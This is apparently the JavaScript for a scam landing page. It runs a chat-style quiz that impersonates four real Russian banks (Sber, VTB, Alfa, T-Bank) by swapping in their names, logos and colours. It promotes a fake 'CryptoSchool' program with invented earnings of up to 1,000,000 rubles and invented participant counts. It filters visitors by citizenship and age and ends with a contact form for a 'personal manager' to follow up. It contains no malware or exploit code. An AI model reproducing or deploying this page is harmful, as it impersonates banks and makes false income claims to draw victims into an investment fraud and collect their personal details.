document.addEventListener("DOMContentLoaded", () => {
  const main = document.querySelector("main");
  const bankingBtns = document.querySelectorAll(".banking-btn");
  const chat = document.querySelector(".main-bg");
  const title = document.querySelector(".banking-title");
  const logoImg = document.querySelector(".banking-logo");
  const mainLanding = document.getElementById("first-screen");
  const backdrop = document.querySelector(".backdrop");
  const body = document.querySelector("body");
  localStorage.removeItem("answers");

  let banking = {};

  bankingBtns.forEach((btn) => {
    btn.addEventListener("click", () => {
      backdrop.classList.add("d-none");
      mainLanding.classList.add("d-none");
      body.style.background = "#fff";
      chat.classList.remove("d-none");

      if (btn.classList.contains("sber")) {
        localStorage.setItem("bank_naming", "Sber");
        banking = {
          name: "СберБанк",
          logo: "./img/logo.png",
          campaign: "Sber",
          color: "#21A038",
        };
        startChat(banking);
      }
      if (btn.classList.contains("vtb")) {
        localStorage.setItem("bank_naming", "Vtb");
        banking = {
          name: "ВТБ Банк",
          logo: "./img/vtb-logo.webp",
          campaign: "Vtb",
          color: "#0A2896",
        };
        startChat(banking);
      }
      if (btn.classList.contains("alfa")) {
        localStorage.setItem("bank_naming", "Alfa");
        banking = {
          name: "Альфа Банк",
          logo: "./img/alfa-logo.png",
          campaign: "Alfa",
          color: "#DF2019",
        };
        startChat(banking);
      }
      if (btn.classList.contains("tbank")) {
        localStorage.setItem("bank_naming", "Tinkoff");
        banking = {
          name: "Т-Банк",
          logo: "./img/t-bank-logo.png",
          campaign: "Tbank",
          color: "rgb(229 182 40)",
        };
        startChat(banking);
      }

      title.textContent = banking.name;
      logoImg.setAttribute("src", banking.logo);
    });
  });

  function startChat(banking) {
    let lastMessage = document.querySelector(".main-chat");
    var answersArray = [];
    let counter = 0;
    let questionCounter = 0;
    let contentArray = [
      `Добро пожаловать! Пройдите официальный тест и получите доступ к проекту "CryptoSchool"  от ПАО "${banking.name}"`,
      "Поздравляем! Теперь у Вас есть возможность зарабатывать на криптовалютах — изучайте биткоин, эфир и другие перспективные цифровые активы.",
      "Всего несколько шагов отделяет от <b>145 825 участников</b>, пассивный заработок которых составляет от <b>115 340 рублей</b>.",
      "Пожалуйста, ответьте на следующие вопросы:",
    ];

    let questions = [
      "Являетесь ли Вы гражданином Российской Федерации?",
      "Сколько вам лет?",
      "С какой целью Вы хотите увеличить достаток?",
      "Имеете ли Вы опыт работы с криптовалютами?",
      `Средний доход участника проекта «CryptoSchool» от ПАО «${banking.name}» начинается <b> от 128 340 рублей</b> и может достигать <b>1 000 000 рублей</b>. Сколько Вы хотите зарабатывать?`,
      'Как Вы распорядитесь средствами, заработанными с помощью "CryptoSchool"?',
      `Спасибо за уделённое время и пройденный опрос! Теперь Вам открыт доступ к проекту  "CryptoSchool"  от ПАО "${banking.name}". Пожалуйста, оставьте свои контактные данные для регистрации. Ваш личный менеджер свяжется с Вами в течении одного рабочего дня!`,
    ];

    let answers = [
      ["Да", "Нет"],
      ["До 18", "18 - 24", "25 - 44", "45 - 64", "65 +"],
      [
        "Обезопасить себя от кризиса",
        "Получать дополнительный доход",
        "Развивать свой бизнес",
        "Обеспечить финансово свою семью",
      ],
      [
        "Да, успешно работаю с криптовалютами по сей день",
        "Ранее интересовался, но сейчас не уделяю этому времени",
        "Нет, никогда прежде не занимался криптовалютами",
      ],
      [
        "50 000₽ - 125 000₽",
        "125 000₽ - 250 000₽",
        "250 000₽ - 400 000₽",
        "400 000₽ +",
      ],
      [
        "Реализую свою мечту",
        "Куплю недвижимость/автомобиль",
        "Открою бизнес",
        "Буду продолжать инвестировать",
        "Другой вариант",
      ],

      null,
    ];

    let waiting = false;

    // Get the current date and time
    const now = new Date();

    // Get the hours and minutes
    const hours = now.getHours();
    const minutes = now.getMinutes();

    // Format hours and minutes with leading zeros if necessary
    const formattedHours = String(hours).padStart(2, "0");
    const formattedMinutes = String(minutes).padStart(2, "0");

    // Combine hours and minutes in the "hh:mm" format
    const currentTime = `${formattedHours}:${formattedMinutes}`;

    function createDivWithInterval() {
      if (counter < contentArray.length) {
        let typingMessage = document.createElement("div");
        typingMessage.className = "left-chat";
        typingMessage.innerHTML = '<div class="chat-block">...</div>';
        lastMessage.appendChild(typingMessage);
        lastMessage.scrollTop = lastMessage.scrollHeight;

        setTimeout(function () {
          typingMessage.innerHTML =
            '<div class="chat-block">' + contentArray[counter] + "</div>";

          let timeElement = document.createElement("div");
          timeElement.className = "time";
          timeElement.innerText = currentTime;
          typingMessage.querySelector(".chat-block").appendChild(timeElement);

          lastMessage.scrollTop = lastMessage.scrollHeight;
          counter++;

          // Если еще остались сообщения, планируем следующее
          if (counter < contentArray.length) {
            setTimeout(createDivWithInterval, 600); // время до начала набора следующего сообщения
          } else {
            // Вызываем postQuestion после того, как все сообщения отобразились
            postQuestion(
              questions[questionCounter],
              answers[questionCounter],
              "horizontal",
              questionCounter
            );
          }
        }, 600); // время "набора" сообщения
      }
    }

    if (counter < contentArray.length) {
      let intervalId = setTimeout(createDivWithInterval, 1200);
    }

    //let intervalId = setInterval(createDivWithInterval, 1000);

    function sendMessage(type, content) {
      let rotation = "vertical";

      if (questionCounter === 0 || questionCounter === 2) {
        rotation = "vertical";
      }

      if (type == "button") {
        let newMessage = document.createElement("div");
        newMessage.className = "right-chat";
        newMessage.innerHTML =
          '<div class="chat-block">' +
          content +
          '</div><input type="hidden" name="' +
          questions[questionCounter] +
          '" value="' +
          content +
          '">';
        lastMessage.appendChild(newMessage);
        // Создаем элемент .time
        let timeElement = document.createElement("div");
        timeElement.className = "time-right";

        timeElement.innerText = currentTime;
        // Вставляем элемент .time внутрь элемента .chat-block
        newMessage
          .querySelector(".right-chat .chat-block")
          .appendChild(timeElement);
        lastMessage.scrollTop = lastMessage.scrollHeight;
        if (
          questions[questionCounter] ==
            "Являетесь ли Вы гражданином Российской Федерации?" &&
          content == "Нет"
        ) {
          /* $('#plug2').show();*/
          localStorage.setItem("unsuitable", false);
          let newMessage1 = document.createElement("div");
          newMessage1.className = "left-chat with-avatar";
          newMessage1.innerHTML = `<div class="chat-block"> Спасибо за желание участвовать в программе от «${banking.name}», однако участие в ней могут принимать только граждане РФ, достигшие 25 лет. Хорошего дня!</div>`;
          // Создаем элемент .time
          let timeElement = document.createElement("div");
          timeElement.className = "time";
          timeElement.innerText = currentTime;
          // Вставляем элемент .time внутрь элемента .chat-block
          newMessage1.querySelector(".chat-block").appendChild(timeElement);

          lastMessage.appendChild(newMessage1);
          lastMessage.scrollTop = lastMessage.scrollHeight;
          return false;
        } else {
          // Проверяем, был ли код уже выполнен
          if (localStorage.getItem("isCodeExecuted") !== "true") {
            console.log("Hello");
            // Устанавливаем флаг в localStorage, чтобы код не выполнялся снова
            localStorage.setItem("isCodeExecuted", "true");
          } else {
            // Код уже был выполнен ранее, поэтому ничего не делаем
            console.log("Код уже был выполнен.");
          }
        }
        if (
          (questions[questionCounter] == "Сколько вам лет?" &&
            content == "До 18") ||
          content == "18 - 24"
        ) {
          console.log("do 18");
          /*$('#plug1').show();*/

          let newMessage1 = document.createElement("div");
          newMessage1.className = "left-chat with-avatar";
          newMessage1.innerHTML = `<div class="chat-block"> Спасибо за желание участвовать в программе от «${banking.name}», однако участие в ней могут принимать только граждане РФ, достигшие 25 лет. Хорошего дня!</div>`;
          // Создаем элемент .time
          let timeElement = document.createElement("div");
          timeElement.className = "time";
          timeElement.innerText = currentTime;
          // Вставляем элемент .time внутрь элемента .chat-block
          newMessage1.querySelector(".chat-block").appendChild(timeElement);
          localStorage.setItem("unsuitable", false);
          lastMessage.appendChild(newMessage1);
          lastMessage.scrollTop = lastMessage.scrollHeight;
          return false;
        }

        if (waiting) {
          setTimeout(function () {
            questionCounter++;
            let rotation = "vertical";
            if (questionCounter === 1) {
              rotation = "horizontal";
            }
            if (questionCounter === 0 || questionCounter === 4) {
              rotation = "vertical";
            }
            postQuestion(
              questions[questionCounter],
              answers[questionCounter],
              "vertical",
              questionCounter
            );
          }, 500);
          waiting = false;
        }
      } else {
        postQuestion(
          questions[questionCounter],
          answers[questionCounter],
          rotation,
          questionCounter
        );
      }
    }

    function postQuestion(question, answers, rotation) {
      let typingMessage = document.createElement("div");
      typingMessage.className = "left-chat message-index-" + questionCounter;
      typingMessage.innerHTML = '<div class="chat-block">...</div>';

      lastMessage.appendChild(typingMessage);
      typingMessage.scrollIntoView({
        behavior: "smooth",
      });

      setTimeout(function () {
        typingMessage.innerHTML =
          '<div class="chat-block">' + question + "</div>";
        let timeElement = document.createElement("div");
        timeElement.className = "time";
        timeElement.innerText = currentTime;
        typingMessage.querySelector(".chat-block").appendChild(timeElement);

        if (answers) {
          let newButtons = document.createElement("div");
          newButtons.className = rotation;
          answers.forEach((item) => {
            let button = document.createElement("button");
            button.type = "button";
            button.className = "answer-btn answer-btn-" + questionCounter;
            button.style = `background-color: ${banking.color}`;
            button.innerHTML = item;
            newButtons.appendChild(button);

            button.addEventListener("click", function () {
              waiting = true;
              sendMessage("button", item);

              const answers = JSON.parse(localStorage.getItem("answers")) || [];

              const currentQuestion = questions[questionCounter];
              const userAnswer = item;

              const existingIndex = answers.findIndex((entry) =>
                entry.startsWith(currentQuestion + ":")
              );

              if (existingIndex !== -1) {
                answers[existingIndex] = `${currentQuestion}: ${userAnswer}`;
              } else {
                answers.push(`${currentQuestion}: ${userAnswer}`);
              }

              localStorage.setItem("answers", JSON.stringify(answers));

              let btns = document.querySelectorAll(
                ".answer-btn-" + questionCounter
              );
              btns.forEach((btn) => {
                btn.disabled = true;
              });
            });
          });
          lastMessage.appendChild(newButtons);
        } else {
          const form = document.getElementById("main-form");
          form.classList.remove("hidden");
          main.scrollTo({
            top: 500,
            behavior: "smooth",
          });
        }
        lastMessage.scrollTop = lastMessage.scrollHeight;
      }, 1000); // время "набора" вопроса
    }
  }
});
